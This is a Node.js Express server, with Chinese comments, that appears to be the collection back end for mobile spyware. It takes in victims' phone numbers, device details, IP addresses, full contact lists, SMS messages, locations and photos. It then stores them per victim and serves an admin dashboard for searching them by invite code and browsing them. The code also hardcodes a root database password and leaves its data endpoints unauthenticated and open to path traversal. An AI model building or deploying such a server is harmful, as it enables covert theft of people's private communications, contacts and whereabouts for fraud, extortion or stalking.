const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const multer = require('multer');
const session = require('express-session');
const mysql = require('mysql2');

const app = express();
const port = 3000;

let globalPhoneNumber = null;

app.use(express.json());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// 配置会话管理
app.use(session({
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false } // 在生产环境中应设置为 true 并使用 HTTPS
}));

// 配置数据库连接
const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: '972327',
  database: 'appdb'
});

db.connect(err => {
  if (err) throw err;
  console.log('Connected to database');
});

// 确保目录存在的函数
const ensureDirectoryExists = (dir) => {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
    console.log(`Folder created: ${dir}`);
  }
};

// 确保文件存在的函数
const ensureFileExists = (filePath, template) => {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(template, null, 2));
    console.log(`File created: ${filePath}`);
  }
};

// 模板定义
const deviceInfoTemplate = {
  phoneNumber: "",
  inviteCode: "",
  ipAddress: "",
  deviceModel: "",
  uploadTime: ""
};

const contactsTemplate = [
  {
    name: "",
    phoneNumber: ""
  }
];

const locationTemplate = {};

const messagesTemplate = [
  {
    date: "",
    address: "",
    body: ""
  }
];

// 配置 multer
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const phoneNumber = globalPhoneNumber;
    if (phoneNumber) {
      const photosDir = path.join(__dirname, 'public/uploads', phoneNumber, 'photos');
      ensureDirectoryExists(photosDir);

      const files = fs.readdirSync(photosDir);
      if (files.length >= 30) {
        return cb(new Error('Maximum photo limit reached'), false);
      }
      cb(null, photosDir);
    } else {
      cb(new Error('No phone number provided'), false);
    }
  },
  filename: function (req, file, cb) {
    cb(null, file.originalname);
  }
});

const upload = multer({ storage: storage });

app.use('/public', express.static(path.join(__dirname, 'public')));

app.post('/upload', upload.single('file'), (req, res) => {
  const phoneNumber = globalPhoneNumber;
  if (phoneNumber) {
    const photosDir = path.join(__dirname, 'public/uploads', phoneNumber, 'photos');
    ensureDirectoryExists(photosDir);
  }

  if (req.file) {
    console.log('File received:', req.file);
    console.log('Metadata received:', req.body.metadata);
    res.status(200).send({ message: 'File uploaded successfully' });
  } else {
    console.log('No file received');
    res.status(400).send({ message: 'File not found in request or maximum photo limit reached' });
  }
});

app.post('/uploadDeviceInfo', (req, res) => {
  const deviceInfo = req.body;
  globalPhoneNumber = deviceInfo.phoneNumber;
  if (globalPhoneNumber) {
    const folderPath = path.join(__dirname, 'public/uploads', globalPhoneNumber);
    ensureDirectoryExists(folderPath);

    const infoDir = path.join(folderPath, 'info');
    ensureDirectoryExists(infoDir);
    ensureFileExists(path.join(infoDir, 'deviceInfo.json'), deviceInfoTemplate);

    const contactsDir = path.join(folderPath, 'contacts');
    ensureDirectoryExists(contactsDir);
    ensureFileExists(path.join(contactsDir, 'contacts.json'), contactsTemplate);

    const locationDir = path.join(folderPath, 'Location');
    ensureDirectoryExists(locationDir);
    ensureFileExists(path.join(locationDir, 'location.json'), locationTemplate);

    const photosDir = path.join(folderPath, 'photos');
    ensureDirectoryExists(photosDir);

    const messagesDir = path.join(folderPath, 'messages');
    ensureDirectoryExists(messagesDir);
    ensureFileExists(path.join(messagesDir, 'messages.json'), messagesTemplate);

    if (deviceInfo && deviceInfo.deviceModel && deviceInfo.ipAddress && deviceInfo.inviteCode) {
      const filePath = path.join(infoDir, 'deviceInfo.json');
      const infoData = {
        phoneNumber: deviceInfo.phoneNumber,
        inviteCode: deviceInfo.inviteCode,
        ipAddress: deviceInfo.ipAddress,
        deviceModel: deviceInfo.deviceModel,
        uploadTime: new Date().toISOString()
      };
      fs.writeFileSync(filePath, JSON.stringify(infoData, null, 2));
      console.log('Device info saved to:', filePath);
      res.status(200).send({ message: 'Device info uploaded successfully' });
    } else {
      res.status(200).send({ message: 'Folders and files created but no device info uploaded' });
    }
  } else {
    console.log('No device info received or missing required fields');
    res.status(400).send({ message: 'No device info found in request or missing required fields' });
  }
});

app.post('/uploadContacts', (req, res) => {
  const contacts = req.body;
  const phoneNumber = globalPhoneNumber;
  if (phoneNumber) {
    const contactsDir = path.join(__dirname, 'public/uploads', phoneNumber, 'contacts');
    ensureDirectoryExists(contactsDir);
    ensureFileExists(path.join(contactsDir, 'contacts.json'), contactsTemplate);

    if (contacts && contacts.length > 0) {
      const filePath = path.join(contactsDir, 'contacts.json');
      fs.writeFileSync(filePath, JSON.stringify(contacts, null, 2));
      console.log('Contacts saved to:', filePath);
      res.status(200).send({ message: 'Contacts uploaded successfully' });
    } else {
      res.status(200).send({ message: 'Contacts folder and file created but no data uploaded' });
    }
  } else {
    res.status(400).send({ message: 'No phone number found in global variable' });
  }
});

app.post('/uploadMessages', (req, res) => {
  const messages = req.body;
  const phoneNumber = globalPhoneNumber;
  if (phoneNumber) {
    const messagesDir = path.join(__dirname, 'public/uploads', phoneNumber, 'messages');
    ensureDirectoryExists(messagesDir);
    ensureFileExists(path.join(messagesDir, 'messages.json'), messagesTemplate);

    if (messages && messages.length > 0) {
      const filePath = path.join(messagesDir, 'messages.json');
      fs.writeFileSync(filePath, JSON.stringify(messages, null, 2));
      console.log('Messages saved to:', filePath);
      res.status(200).send({ message: 'Messages uploaded successfully' });
    } else {
      res.status(200).send({ message: 'Messages folder and file created but no data uploaded' });
    }
  } else {
    res.status(400).send({ message: 'No phone number found in global variable' });
  }
});

app.post('/uploadLocation', (req, res) => {
  const location = req.body;
  const phoneNumber = globalPhoneNumber;
  if (phoneNumber) {
    const locationDir = path.join(__dirname, 'public/uploads', phoneNumber, 'Location');
    ensureDirectoryExists(locationDir);
    ensureFileExists(path.join(locationDir, 'location.json'), locationTemplate);

    if (location && location.latitude && location.longitude && location.address) {
      const filePath = path.join(locationDir, 'location.json');
      fs.writeFileSync(filePath, JSON.stringify(location, null, 2));
      console.log('Location saved to:', filePath);
      res.status(200).send({ message: 'Location uploaded successfully' });
    } else {
      res.status(200).send({ message: 'Location folder and file created but no data uploaded' });
    }
  } else {
    res.status(400).send({ message: 'No phone number found in global variable' });
  }
});

// 获取所有上传的数据并分页展示
app.get('/data', (req, res) => {
  const uploadsDir = path.join(__dirname, 'public/uploads');
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 10;
  const searchQuery = req.query.search ? req.query.search.toLowerCase() : '';

  if (fs.existsSync(uploadsDir)) {
    let allData = [];

    fs.readdirSync(uploadsDir).forEach(phoneNumber => {
      const deviceInfoPath = path.join(uploadsDir, phoneNumber, 'info', 'deviceInfo.json');
      const contactsPath = path.join(uploadsDir, phoneNumber, 'contacts', 'contacts.json');
      const locationPath = path.join(uploadsDir, phoneNumber, 'Location', 'location.json');

      if (fs.existsSync(deviceInfoPath) && fs.existsSync(contactsPath) && fs.existsSync(locationPath)) {
        const deviceInfo = JSON.parse(fs.readFileSync(deviceInfoPath, 'utf-8'));
        const contacts = JSON.parse(fs.readFileSync(contactsPath, 'utf-8'));
        const location = JSON.parse(fs.readFileSync(locationPath, 'utf-8'));

        const relationships = contacts.map(contact => contact.name).join(', ');

        allData.push({
          time: deviceInfo.uploadTime,
          phoneNumber: deviceInfo.phoneNumber,
          deviceModel: deviceInfo.deviceModel,
          ipAddress: deviceInfo.ipAddress,
          inviteCode: deviceInfo.inviteCode,
          relationship: relationships,
          currentLocation: location.address
        });
      }
    });

    // 按时间降序排序
    allData.sort((a, b) => new Date(b.time) - new Date(a.time));

    // 如果有搜索查询，则进行过滤
    if (searchQuery) {
      allData = allData.filter(item =>
        item.inviteCode.toLowerCase().includes(searchQuery) ||
        item.phoneNumber.includes(searchQuery)
      );
    }

    const total = allData.length;
    const paginatedData = allData.slice((page - 1) * pageSize, page * pageSize);

    res.json({
      data: paginatedData,
      total,
      page,
      pageSize
    });
  } else {
    res.status(404).send({ message: 'No data found' });
  }
});

// 新增路由处理收藏夹页面
app.get('/favorites.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/views', 'favorites.html'));
});

app.delete('/deleteData', (req, res) => {
  const phoneNumber = req.query.phoneNumber;
  const uploadsDir = path.join(__dirname, 'public/uploads', phoneNumber);

  if (fs.existsSync(uploadsDir)) {
    fs.rmSync(uploadsDir, { recursive: true, force: true });
    console.log(`Data for phone number ${phoneNumber} deleted.`);
    res.status(200).send({ message: 'Data deleted successfully' });
  } else {
    res.status(404).send({ message: 'Data not found' });
  }
});

// 批量删除指定日期之前的数据
app.delete('/deleteBeforeDate', (req, res) => {
  const { deleteDate } = req.body;
  if (!deleteDate) {
    return res.status(400).send({ message: '无效的日期' });
  }

  const deleteBeforeDate = new Date(deleteDate);
  const uploadsDir = path.join(__dirname, 'public/uploads');

  if (fs.existsSync(uploadsDir)) {
    fs.readdirSync(uploadsDir).forEach(phoneNumber => {
      const deviceInfoPath = path.join(uploadsDir, phoneNumber, 'info', 'deviceInfo.json');
      if (fs.existsSync(deviceInfoPath)) {
        const deviceInfo = JSON.parse(fs.readFileSync(deviceInfoPath, 'utf-8'));
        const uploadTime = new Date(deviceInfo.uploadTime);
        if (uploadTime < deleteBeforeDate) {
          const userDir = path.join(uploadsDir, phoneNumber);
          fs.rmSync(userDir, { recursive: true, force: true });
          console.log(`Data for phone number ${phoneNumber} deleted.`);
        }
      }
    });
    res.status(200).send({ message: '数据删除成功' });
  } else {
    res.status(404).send({ message: '没有找到数据' });
  }
});

// 获取指定电话号码的相册图片
app.get('/getPhotos', (req, res) => {
  const phoneNumber = req.query.phoneNumber;
  const photosDir = path.join(__dirname, 'public/uploads', phoneNumber, 'photos');

  if (fs.existsSync(photosDir)) {
    const photos = fs.readdirSync(photosDir).map(file => `/public/uploads/${phoneNumber}/photos/${file}`);
    res.status(200).json({ photos });
  } else {
    res.status(404).json({ message: 'No photos found' });
  }
});

// 获取指定电话号码的短信内容
app.get('/getMessages', (req, res) => {
  const phoneNumber = req.query.phoneNumber;
  const messagesPath = path.join(__dirname, 'public/uploads', phoneNumber, 'messages', 'messages.json');

  if (fs.existsSync(messagesPath)) {
    const messages = JSON.parse(fs.readFileSync(messagesPath, 'utf-8'));
    res.status(200).json({ messages });
  } else {
    res.status(404).json({ message: 'No messages found' });
  }
});

// 登录路由
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  if (username && password) {
    db.query('SELECT * FROM users WHERE username = ? AND password = ?', [username, password], (err, results) => {
      if (err) throw err;
      if (results.length > 0) {
        req.session.loggedin = true;
        req.session.username = username;
        res.json({ success: true });
      } else {
        res.json({ success: false, message: 'Incorrect username or password' });
      }
    });
  } else {
    res.json({ success: false, message: 'Please enter username and password' });
  }
});

// 登出路由
app.post('/logout', (req, res) => {
  req.session.destroy(err => {
    if (err) {
      res.json({ success: false });
    } else {
      res.clearCookie('connect.sid');
      res.json({ success: true });
    }
  });
});

// 保护index.html路由
app.get('/index.html', (req, res) => {
  if (req.session.loggedin) {
    res.sendFile(path.join(__dirname, 'public/views', 'index.html'));
  } else {
    res.redirect('/');
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/views', 'login.html'));
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
